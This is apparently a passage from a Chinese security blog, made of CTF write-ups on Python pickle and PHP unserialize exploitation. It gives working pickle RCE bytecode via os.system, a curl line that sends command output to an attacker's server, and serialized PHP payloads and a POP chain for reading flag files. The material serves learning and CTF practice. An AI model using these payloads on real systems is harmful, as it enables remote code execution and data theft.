student</code>则会引发错误然后退出，那该如何解决？</p><p>我们知道，通过GLOBAL引入的变量，可以看作是原变量的引用，<strong>当我们在栈上修改它的值</strong>，会导致原变量也被修改！思路如下：</p><ul><li>通过<code>__main__.blue</code>引入这一个<code>module</code>，由于命名空间还在main内，故不会拦截，也就是说，在<code>__main__</code>上再新构造一个模块，用来对数据进行改写</li><li>把一个<code>dict</code>压进栈，内容是<code>&#123;&#39;name&#39;:&#39;B&#39;,&#39;grade&#39;:&#39;B&#39;&#125;</code></li><li>执行<code>BUILD</code>指令，会改写<code>__main__.blue.name</code>和<code>__main__.blue.grade</code>，到这里<code>blue.name</code>和<code>blue.grade</code>已经被篡改成我们想要的内容</li><li>弹掉栈顶，现在栈变成空的</li><li>照抄正常的Student序列化之后的字符串，压入一个正常的<code>student</code>对象，<code>name</code>和<code>grade</code>分别是<code>&#39;B&#39;</code>和<code>&#39;B&#39;</code>由于</li></ul><p>由于栈顶是正常的<code>student</code>对象（<code>if</code>语句判断用过），<code>pickle.loads</code>会返回正常，于是到手的<code>student</code>对象<code>name</code>和<code>grade</code>都与<code>blue.name</code>、<code>blue.grade</code>对应了</p><p><code>payload</code>如下：</p><pre class="language-python" data-language="python"><code class="language-python">b&#39;\x80\x03c__main__\nblue\n&#125;(Vname\nVB\nVgrade\nVB\nub0c__main__\nstudent\n)\x81&#125;(X\x04\x00\x00\x00nameX\x01\x00\x00\x00BX\x05\x00\x00\x00gradeX\x01\x00\x00\x00Bub.&#39;</code></pre><p>其中q指令可省略</p><p>把过程输出执行结果如下：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%B5%85%E6%9E%90/image-20200406221611185.png" alt loading="lazy"></p><p>可看到成功绕过了判断</p><h4 id="setstate"><a href="#setstate" class="headerlink" title="setstate"></a>setstate</h4><p>如果<code>inst</code>有<code>__setstate__</code>方法，则把<code>state</code>交给<code>__setstate__</code>方法来处理，否则的话，直接把<code>state</code>这个<code>dist</code>的内容，合并到<code>inst.__dict__</code>里面</p><p><code>__setstate__</code>与<code>__getstate__</code>的关系：<code>pickle</code>一个类的实例时，Python 将只 <code>pickle</code> 当它调用该实例的 <code>getstate()</code> 方法时返回给它的值。类似的，在 <code>unpickle</code> 时，Python 将提供经过 <code>unpickle</code> 的值作为参数传递给实例的 <code>setstate()</code> 方法。</p><pre class="language-python" data-language="python"><code class="language-python">import pickleimport pickletoolsclass Foo():  def __init__(self):     self.val &#x3D; 2020  def __getstate__(self):     print(&quot;I&#39;m being pickled&quot;)     self.val *&#x3D; 2     return self.__dict__  def __setstate__(self, d):     print(&quot;I&#39;m being unpickled with these values:&#123;&#125;&quot;.format(d))      self.__dict__ &#x3D; d     self.val *&#x3D; 3f &#x3D; Foo()f_string &#x3D; pickle.dumps(f)print(f_string)a &#x3D; pickletools.optimize(f_string)pickletools.dis(a)f_new &#x3D; pickle.loads(f_string)print(&quot;&#123;&#125;&quot;.format(f_new.val))</code></pre><p>代码执行结果如下：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%B5%85%E6%9E%90/image-20200407095734164.png" alt loading="lazy"></p><p>可看到<code>pickle</code>时执行了<code>__getstate__</code>方法，<code>unpickle</code>时执行了<code>__setstate__</code>方法，且使用了<code>__getstate__</code>方法返回的值</p><p>如果当原对象没有<code>__setstate__</code>这个方法的时候，如果我们构造了一个<code>&#123;&#39;__setstate__&#39;: os.system&#125;</code>来<code>BUILD</code>这个对象，就会造成任意代码执行，现在对象的<code>__setstate__</code>就变成了</p><p><code>os.system</code>，接下来再次利用<code>dir</code>来<code>BUILD</code>这个对象，就构成了<code>os.system(&#39;dir&#39;)</code>命令执行，实现了RCE</p><p><code>payload</code>：<code>b&#39;\x80\x03c__main__\nFoo\n)\x81&#125;(V__setstate__\ncos\nsystem\nubVdir\nb.&#39;</code></p><p>有如下代码：</p><pre class="language-python" data-language="python"><code class="language-python">import pickleimport pickletoolsclass Foo():  def __init__(self):     self.val &#x3D; 2020  def __getstate__(self):     print(&quot;I&#39;m being pickled&quot;)     self.val *&#x3D; 2     return self.__dict__f &#x3D; Foo()f_string &#x3D; pickle.dumps(f)print(f_string)a &#x3D; pickletools.optimize(f_string)pickletools.dis(a)f_new &#x3D; pickle.loads(f_string)print(&quot;&#123;&#125;&quot;.format(f_new.val))d &#x3D; b&#39;\x80\x03c__main__\nFoo\n)\x81&#125;(V__setstate__\ncos\nsystem\nubVdir\nb.&#39;c &#x3D; pickletools.optimize(d)pickletools.dis(c)pickle.loads(c)</code></pre><p>执行结果如下：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%B5%85%E6%9E%90/image-20200407100434411.png" alt loading="lazy"></p><p>可见成功执行了命令</p><p>完整payload如下：</p><pre class="language-python" data-language="python"><code class="language-python">b&#39;\x80\x03c__main__\nFoo\n)\x81&#125;(V__setstate__\ncos\nsystem\nubVdir\nb0c__main__\nFoo\nq\x00)\x81q\x01&#125;q\x02X\x03\x00\x00\x00valq\x03K\x04sb.&#39;</code></pre><p>恶意代码执行完后将栈弹空，然后压一个正常的<code>student</code>入栈</p><h3 id="细节"><a href="#细节" class="headerlink" title="细节"></a>细节</h3><p>其他模块的load也可以触发pickle反序列化漏洞。例如：<code>numpy.load()</code>先尝试以numpy自己的数据格式导入；如果失败，则尝试以pickle的格式导入。因此<code>numpy.load()</code>也可以触发pickle反序列化漏洞。</p><p>即使代码中没有<code>import os</code>，GLOBAL指令也可以自动导入<code>os.system</code>。因此，不能认为“我不在代码里面导入os库，pickle反序列化的时候就不能执行os.system”。</p><p>即使没有回显，也可以很方便地调试恶意代码。只需要拥有一台公网服务器，执行</p><pre class="language-none"><code class="language-none">os.system(&#39;curl your_server&#x2F;&#96;ls &#x2F; | base64&#96;&#39;)</code></pre><p>然后查询您自己的服务器日志，就能看到结果。这是因为：以反引号包含的代码，在sh中会直接执行，返回其结果。</p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ul><li><a href="https://zhuanlan.zhihu.com/p/89132768">https://zhuanlan.zhihu.com/p/89132768</a></li><li><a href="https://mp.weixin.qq.com/s/3CLh1V9FZ36-Tw9ikUSsaA">https://mp.weixin.qq.com/s/3CLh1V9FZ36-Tw9ikUSsaA</a></li><li><a href="https://www.cnblogs.com/cioi/p/12464592.html">https://www.cnblogs.com/cioi/p/12464592.html</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 备忘录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> 反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-反序列化</title>
      <link href="/posts/d3333ead/"/>
      <url>/posts/d3333ead/</url>
      
        <content type="html"><![CDATA[<h2 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h2><p>php中常用的几种魔术方法和触发条件</p><pre class="language-php" data-language="php"><code class="language-php">__construct ：当一个对象创建时被调用__destruct ：当一个对象销毁时被调用__toString ：当一个类或对象被当作一个字符串被调用__wakeup ：当一个对象使用 unserialize 时触发，反序列化时触发__sleep ：当一个对象使用 serialize 时触发，序列化时触发__get ：当一个对象读取不可访问属性的值时触发__set ：当一个对象在给不可访问属性赋值时__isset ：当一个对象当对不可访问属性调用 isset 或 empty 时触发__unset ：当一个对象对不可访问属性调用 unset 时触发__invoke ：当一个对象尝试以调用函数的方式调用一个对象时触发__set_state ：当一个对象调用 var_export 导出类时，此静态方法会被调用__call ：当一个对象在对象上下文中调用不可访问的方法时触发 __callStatic ：当一个对象在静态上下文中调用不可访问的方法时触发</code></pre><p>不同属性之间的区别</p><pre class="language-php" data-language="php"><code class="language-php">public  变量（公有） 直接将变量名反序列化出来 protected  变量（受保护） \x00 + * + \x00 + 变量名 private  变量（私有） \x00 + 类名 + \x00 + 变量名</code></pre><a id="more"></a><hr><h3 id="Web-php-unserialize"><a href="#Web-php-unserialize" class="headerlink" title="Web_php_unserialize"></a>Web_php_unserialize</h3><p>感谢xctf平台，题目<a href="https://adworld.xctf.org.cn/task/answer?type=web&number=3&grade=1&id=5409&page=1">链接</a></p><p>题目代码：</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?php class Demo &#123;     private $file &#x3D; &#39;index.php&#39;;    public function __construct($file) &#123;         $this-&gt;file &#x3D; $file;     &#125;    function __destruct() &#123;         echo @highlight_file($this-&gt;file, true);     &#125;    function __wakeup() &#123;         if ($this-&gt;file !&#x3D; &#39;index.php&#39;) &#123;             &#x2F;&#x2F;the secret is in the fl4g.php            $this-&gt;file &#x3D; &#39;index.php&#39;;         &#125;     &#125; &#125;if (isset($_GET[&#39;var&#39;])) &#123;     $var &#x3D; base64_decode($_GET[&#39;var&#39;]);     if (preg_match(&#39;&#x2F;[oc]:\d+:&#x2F;i&#39;, $var)) &#123;         die(&#39;stop hacking!&#39;);     &#125; else &#123;        @unserialize($var);     &#125; &#125; else &#123;     highlight_file(&quot;index.php&quot;); &#125; ?&gt;</code></pre><p>由代码可知，题目提供了一个<code>var</code>参数给我们进行<code>get</code>传参，首先先对<code>var</code>进行<code>base64</code>解码，然后进入<code>if</code>判断语句，若判断条件不成立就进入<code>else</code>，进行<code>unserialize</code>操作，题目提供了一个<code>Demo</code>类来进行序列化操作，且其中的<code>__destruct</code>方法可以将代码显示出来，题目提示了<code>the secret is in the fl4g.php</code>，flag应该就在<code>fl4g.php</code>中，于是寻找突破点</p><p>题目限制条件：</p><blockquote><p>preg_match(‘/[oc]:\d+:/i’, $var)：对传入的var经过base64解密后的字符串进正则匹配，来防止反序列化操作</p><p><code>__wakeup</code>函数：<code>__wakeup()</code>是用在反序列化操作中。<code>unserialize()</code>会检查存在一个<code>__wakeup()</code>方法。如果存在，则先会调用<code>__wakeup()</code>方法，在这里这个函数会将<code>file</code>赋值为<code>index.php</code></p></blockquote><p>可是这两种方法都可以进行绕过：</p><blockquote><p>preg_match()：这个正则匹配函数是用来防止反序列化的开头的，如<code>O:4:</code>即可匹配上，但可以用+进行绕过，可以写成<code>O:+4:</code>反序列化函数一样识别</p><p><code>__wakeup</code>函数：<code>__wakeup()</code>漏洞就是与整个属性个数值有关。当序列化字符串表示对象属性个数的值大于真实个数的属性时就会跳过<code>__wakeup</code>的执行。例如<code>O:4:&quot;Demo&quot;:1:</code>，Demo后面的1表示的就是类的属性个数，将1改大即可跳过<code>__wakeup</code>函数的执行</p></blockquote><p>于是构造payload：<code>O:+4:&quot;Demo&quot;:4:&#123;s:10:&quot; Demo file&quot;;s:8:&quot;fl4g.php&quot;;&#125;</code></p><p>注意<code>file</code>前面的<code>Demo</code>左右需要有<code>%00</code></p><pre class="language-php" data-language="php"><code class="language-php">序列化后：v1 表示 public   %00Demo%00v2 表示 private(Demo为类名)   %00*%00v3 表示 protected  v1,v2,v3为属性名</code></pre><p><code>base64</code>编码后<code>TzorNDoiRGVtbyI6NDp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ==</code></p><blockquote><p>参考：<br><a href="https://www.jianshu.com/p/8f498198fc3d">php序列化与反序列化入门</a><br><a href="https://www.cnblogs.com/kacha886/p/9115503.html">魔术方法<code>__sleep()</code>,<code>__wakeup()</code></a><br><a href="http://blog.sina.com.cn/s/blog_15ebf299a0102xnug.html">__wakeup()函数漏洞以及实际漏洞分析</a></p></blockquote><p>PS：php代码审计是个大坑，刚接触的话上手还是有点困难，还是要多看看php代码，需要有面向对象编程的思想，否则代码量大的就比较难入手；序列化算是一个重点了吧，原来就接触过好多这样的题，但都不怎么看得懂，所以就都略过了，现在学了点php基础勉强能够看的懂，总之多看多思考，慢慢来吧。</p><hr><h3 id="极客大挑战-2019—PHP"><a href="#极客大挑战-2019—PHP" class="headerlink" title="极客大挑战-2019—PHP"></a>极客大挑战-2019—PHP</h3><p>界面：<br><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20200324104326758.png" alt loading="lazy"></p><p>题目提示网站有备份，于是访问<code>www.zip</code>，得到网页源码：</p><p>index.php</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token doctype">&lt;!DOCTYPE html></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>  ......<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token style"><span class="token language-css">    ......</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>world<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token style-attr language-css"><span class="token attr-name"> <span class="token attr-name">style</span></span><span class="token punctuation">="</span><span class="token attr-value"><span class="token property">text-shadow</span><span class="token punctuation">:</span>0px 0px 5px<span class="token punctuation">;</span><span class="token property">font-family</span><span class="token punctuation">:</span>arial<span class="token punctuation">;</span><span class="token property">color</span><span class="token punctuation">:</span>black<span class="token punctuation">;</span><span class="token property">font-size</span><span class="token punctuation">:</span>20px<span class="token punctuation">;</span><span class="token property">position</span><span class="token punctuation">:</span> absolute<span class="token punctuation">;</span><span class="token property">bottom</span><span class="token punctuation">:</span> 85%<span class="token punctuation">;</span><span class="token property">left</span><span class="token punctuation">:</span> 440px<span class="token punctuation">;</span><span class="token property">font-family</span><span class="token punctuation">:</span>KaiTi<span class="token punctuation">;</span></span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span>因为每次猫猫都在我键盘上乱跳，所以我有一个良好的备份网站的习惯    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token style-attr language-css"><span class="token attr-name"> <span class="token attr-name">style</span></span><span class="token punctuation">="</span><span class="token attr-value"><span class="token property">text-shadow</span><span class="token punctuation">:</span>0px 0px 5px<span class="token punctuation">;</span><span class="token property">font-family</span><span class="token punctuation">:</span>arial<span class="token punctuation">;</span><span class="token property">color</span><span class="token punctuation">:</span>black<span class="token punctuation">;</span><span class="token property">font-size</span><span class="token punctuation">:</span>20px<span class="token punctuation">;</span><span class="token property">position</span><span class="token punctuation">:</span> absolute<span class="token punctuation">;</span><span class="token property">bottom</span><span class="token punctuation">:</span> 80%<span class="token punctuation">;</span><span class="token property">left</span><span class="token punctuation">:</span> 700px<span class="token punctuation">;</span><span class="token property">font-family</span><span class="token punctuation">:</span>KaiTi<span class="token punctuation">;</span></span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span>不愧是我！！！    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token style-attr language-css"><span class="token attr-name"> <span class="token attr-name">style</span></span><span class="token punctuation">="</span><span class="token attr-value"><span class="token property">text-shadow</span><span class="token punctuation">:</span>0px 0px 5px<span class="token punctuation">;</span><span class="token property">font-family</span><span class="token punctuation">:</span>arial<span class="token punctuation">;</span><span class="token property">color</span><span class="token punctuation">:</span>black<span class="token punctuation">;</span><span class="token property">font-size</span><span class="token punctuation">:</span>20px<span class="token punctuation">;</span><span class="token property">position</span><span class="token punctuation">:</span> absolute<span class="token punctuation">;</span><span class="token property">bottom</span><span class="token punctuation">:</span> 70%<span class="token punctuation">;</span><span class="token property">left</span><span class="token punctuation">:</span> 640px<span class="token punctuation">;</span><span class="token property">font-family</span><span class="token punctuation">:</span>KaiTi<span class="token punctuation">;</span></span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token prolog">&lt;?php    include 'class.php';    $select = $_GET['select'];    $res=unserialize(@$select);    ?></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token style-attr language-css"><span class="token attr-name"> <span class="token attr-name">style</span></span><span class="token punctuation">="</span><span class="token attr-value"><span class="token property">position</span><span class="token punctuation">:</span> absolute<span class="token punctuation">;</span><span class="token property">bottom</span><span class="token punctuation">:</span> 5%<span class="token punctuation">;</span><span class="token property">width</span><span class="token punctuation">:</span> 99%<span class="token punctuation">;</span></span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span> <span class="token attr-name">align</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>center<span class="token punctuation">"</span></span><span class="token style-attr language-css"><span class="token attr-name"> <span class="token attr-name">style</span></span><span class="token punctuation">="</span><span class="token attr-value"><span class="token property">font</span><span class="token punctuation">:</span>italic 15px Georgia<span class="token punctuation">,</span>serif<span class="token punctuation">;</span><span class="token property">color</span><span class="token punctuation">:</span>white<span class="token punctuation">;</span></span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span> Syclover @ cl4y<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">'</span>http://cdnjs.cloudflare.com/ajax/libs/three.js/r70/three.min.js<span class="token punctuation">'</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">'</span>http://cdnjs.cloudflare.com/ajax/libs/gsap/1.16.1/TweenMax.min.js<span class="token punctuation">'</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">'</span>https://s3-us-west-2.amazonaws.com/s.cdpn.io/264161/OrbitControls.js<span class="token punctuation">'</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">'</span>https://s3-us-west-2.amazonaws.com/s.cdpn.io/264161/Cat.js<span class="token punctuation">'</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span>  <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>index.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre><p>class.php</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?phpinclude &#39;flag.php&#39;;error_reporting(0);class Name&#123;    private $username &#x3D; &#39;nonono&#39;;    private $password &#x3D; &#39;yesyes&#39;;    public function __construct($username,$password)&#123;        $this-&gt;username &#x3D; $username;        $this-&gt;password &#x3D; $password;    &#125;    function __wakeup()&#123;        $this-&gt;username &#x3D; &#39;guest&#39;;    &#125;    function __destruct()&#123;        if ($this-&gt;password !&#x3D; 100) &#123;            echo &quot;&lt;&#x2F;br&gt;NO!!!hacker!!!&lt;&#x2F;br&gt;&quot;;            echo &quot;You name is: &quot;;            echo $this-&gt;username;echo &quot;&lt;&#x2F;br&gt;&quot;;            echo &quot;You password is: &quot;;            echo $this-&gt;password;echo &quot;&lt;&#x2F;br&gt;&quot;;            die();        &#125;        if ($this-&gt;username &#x3D;&#x3D;&#x3D; &#39;admin&#39;) &#123;            global $flag;            echo $flag;        &#125;else&#123;            echo &quot;&lt;&#x2F;br&gt;hello my friend~~&lt;&#x2F;br&gt;sorry i can&#39;t give you the flag!&quot;;            die();        &#125;    &#125;&#125;?&gt;</code></pre><p>注意到index.php中有对get的select参数进行反序列化操作，并且题目给了一个class.php中的Name类，于是构造反序列化条件：</p><p>观察chass.php代码发现只要令password=100，username=admin，且绕过__wakeup函数即可，于是得到payload：</p><pre class="language-php" data-language="php"><code class="language-php">O:4:&quot;Name&quot;:3:&#123;s:14:&quot;%00Name%00username&quot;;s:5:&quot;admin&quot;;s:14:&quot;%00Name%00password&quot;;s:3:&quot;100&quot;;&#125;</code></pre><p>传入即可</p><hr><h3 id="MRCTF—Ezpop"><a href="#MRCTF—Ezpop" class="headerlink" title="MRCTF—Ezpop"></a>MRCTF—Ezpop</h3><p>题目源码：</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?php&#x2F;&#x2F;flag is in flag.php&#x2F;&#x2F;WTF IS THIS?&#x2F;&#x2F;Learn From https:&#x2F;&#x2F;ctf.ieki.xyz&#x2F;library&#x2F;php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95&#x2F;&#x2F;And Crack It!class Modifier &#123;    protected  $var;    public function append($value)&#123;        include($value);    &#125;    public function __invoke()&#123;        $this-&gt;append($this-&gt;var);    &#125;&#125;class Show&#123;    public $source;    public $str;    public function __construct($file&#x3D;&#39;index.php&#39;)&#123;        $this-&gt;source &#x3D; $file;        echo &#39;Welcome to &#39;.$this-&gt;source.&quot;&lt;br&gt;&quot;;    &#125;    public function __toString()&#123;        return $this-&gt;str-&gt;source;    &#125;    public function __wakeup()&#123;        if(preg_match(&quot;&#x2F;gopher|http|file|ftp|https|dict|\.\.&#x2F;i&quot;, $this-&gt;source)) &#123;            echo &quot;hacker&quot;;            $this-&gt;source &#x3D; &quot;index.php&quot;;        &#125;    &#125;&#125;class Test&#123;    public $p;    public function __construct()&#123;        $this-&gt;p &#x3D; array();    &#125;    public function __get($key)&#123;        $function &#x3D; $this-&gt;p;        return $function();    &#125;&#125;if(isset($_GET[&#39;pop&#39;]))&#123;    @unserialize($_GET[&#39;pop&#39;]);&#125;else&#123;    $a&#x3D;new Show;    highlight_file(__FILE__);&#125;</code></pre><p>一步步审计代码</p><p>首先看到最后的if语句，题目给出了一个可以get的pop参数，随后对其进行反序列化操作，于是直接想到利用反序列化漏洞，再往上看找利用点</p><p>题目给出了三个类，观察可利用点可以在<code>Modifier</code>对象中看到一个include函数，这里就可以利用文件包含从而达到任意文件读取的效果，具体方法只要令<code>include</code>的<code>value</code>为<code>php://filter/read=convert.base64-encode/resource=./flag.php</code>即可读取flag文件，所以就需要想办法利用这个点</p><p>可用看到<code>Modifier</code>对象中有一个<code>__invoke</code>方法代码如下</p><pre class="language-PHP" data-language="PHP"><code class="language-PHP">public function __invoke()&#123;    $this-&gt;append($this-&gt;var);&#125;</code></pre><p>里面调用了可触发条件的<code>append</code>方法，而此方法中的<code>var</code>属性是可控的，于是就可以直接利用<code>var</code>属性来调用<code>append</code>方法，从而达到文件包含的效果，初步构造序列化参数</p><pre class="language-php" data-language="php"><code class="language-php">class Modifier &#123;    protected $var&#x3D;&#39;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;.&#x2F;flag.php&#39;;&#125;$a &#x3D; new Modifier;</code></pre><p>而<code>__invoke</code>函数的使用方法是当尝试以调用函数的方法调用一个对象时触发，于是找到可触发条件，可以在下面的<code>Test</code>对象中看到一个<code>__get</code>方法</p><pre class="language-php" data-language="php"><code class="language-php">public function __get($key)&#123;    $function &#x3D; $this-&gt;p;    return $function();&#125;</code></pre><p>这个方法里面返回的参数刚好可以作为函数条件调用一个对象，于是可以利用此方法调用<code>Modifier</code>对象，只需令里面的参数<code>p</code>为创建的新的<code>Modifier</code>对象即可，就可以触发<code>__invoke</code>函数，而<code>Test</code>对象中的参数<code>p</code>是可控的，于是就可以进一步构造序列化参数</p><pre class="language-php" data-language="php"><code class="language-php">class Modifier &#123;    protected $var&#x3D;&#39;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;.&#x2F;flag.php&#39;;&#125;class Test&#123;    public $p;&#125;$a &#x3D; new Modifier;$b &#x3D; new Test;$b-&gt;p &#x3D; $a;</code></pre><p>随后就需要想办法如何触发<code>__get</code>函数，<code>__get</code>函数的触发条件是当对象读取不可访问的属性的时候触发，于是就需要构造一个不可访问的属性来触发此函数，当然这个属性在对象内部肯定是不存在的，于是就要到外部去找，可以看到<code>Show</code>对象中的<code>__toString</code>方法</p><pre class="language-php" data-language="php"><code class="language-php">public function __toString()&#123;    return $this-&gt;str-&gt;source;&#125;</code></pre><p>这里就可以构造<code>str</code>参数为一个<code>Test</code>对象，然后调用<code>source</code>属性，而<code>Test</code>对象中是没有<code>source</code>这个属性的，这样就可以触发对象中的<code>__get</code>方法，而<code>Show</code>对象中的<code>str</code>属性是可控的，于是就可以接着构造</p><pre class="language-php" data-language="php"><code class="language-php">class Modifier &#123;    protected $var&#x3D;&#39;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;.&#x2F;flag.php&#39;;&#125;class Show&#123;    public $str;&#125;class Test&#123;    public $p;&#125;$a &#x3D; new Modifier;$b &#x3D; new Test;$b-&gt;p &#x3D; $a;$c &#x3D; new Show;$c-&gt;str &#x3D; $b</code></pre><p>然后就该想想<code>__toString</code>方法该如何触发了，<code>__toString</code>方法触发条件是当对象被当做一个字符串被调用，于是寻找触发点可以在函数下方看到一个<code>__wakeup</code>方法</p><pre class="language-php" data-language="php"><code class="language-php">public function __wakeup()&#123;    if(preg_match(&quot;&#x2F;gopher|http|file|ftp|https|dict|\.\.&#x2F;i&quot;, $this-&gt;source)) &#123;        echo &quot;hacker&quot;;        $this-&gt;source &#x3D; &quot;index.php&quot;;    &#125;&#125;</code></pre><p><code>__wakeup</code>函数之中的<code>source</code>属性在进行<code>preg_match</code>正则匹配的时候会被当做一个字符串来使用，于是就可以令<code>source</code>属性为上一个构造的<code>Show</code>对象，这样在进行正则匹配判断的时候就会吧这个对象当做字符串来处理，从而就可以触发<code>__toString</code>方法，于是就可以写出构造方法</p><pre class="language-php" data-language="php"><code class="language-php">class Modifier &#123;    protected $var&#x3D;&#39;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;.&#x2F;flag.php&#39;;&#125;class Show&#123;    public $source;    public $str;&#125;class Test&#123;    public $p;&#125;$a &#x3D; new Modifier;$b &#x3D; new Test;$b-&gt;p &#x3D; $a;$c &#x3D; new Show;$c-&gt;str &#x3D; $b;$d &#x3D; new Show;$d-&gt;source &#x3D; $c;</code></pre><p><code>__wakeup</code>触发的条件是当我们反序列化这个对象的时候就会触发这个函数，这个方法就无需我们再去找触发点了，只需要把<code>Show</code>反序列化就可以了，而这题的<code>pop</code>参数就提供了这样的条件，于是最终构造出序列化方法</p><pre class="language-php" data-language="php"><code class="language-php">class Modifier &#123;    protected $var&#x3D;&#39;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;.&#x2F;flag.php&#39;;&#125;class Show&#123;    public $source;    public $str;&#125;class Test&#123;    public $p;&#125;$a &#x3D; new Modifier;$b &#x3D; new Test;$b-&gt;p &#x3D; $a;$c &#x3D; new Show;$c-&gt;str &#x3D; $b;$d &#x3D; new Show;$d-&gt;source &#x3D; $c;echo serialize($d);</code></pre><p>于是最总payload：</p><pre class="language-php" data-language="php"><code class="language-php">O:4:&quot;Show&quot;:2:&#123;s:6:&quot;source&quot;;O:4:&quot;Show&quot;:2:&#123;s:6:&quot;source&quot;;N;s:3:&quot;str&quot;;O:4:&quot;Test&quot;:1:&#123;s:1:&quot;p&quot;;O:8:&quot;Modifier&quot;:1:&#123;s:6:&quot;%00*%00var&quot;;s:59:&quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;.&#x2F;flag.php&quot;;&#125;&#125;&#125;s:3:&quot;str&quot;;N;&#125;</code></pre><p>get传入pop=payload即可得到base64加密后的flag，解密即可。</p><h3 id="0CTF-2016-piapiapia"><a href="#0CTF-2016-piapiapia" class="headerlink" title="0CTF 2016-piapiapia"></a>0CTF 2016-piapiapia</h3><p>界面：</p><p><img 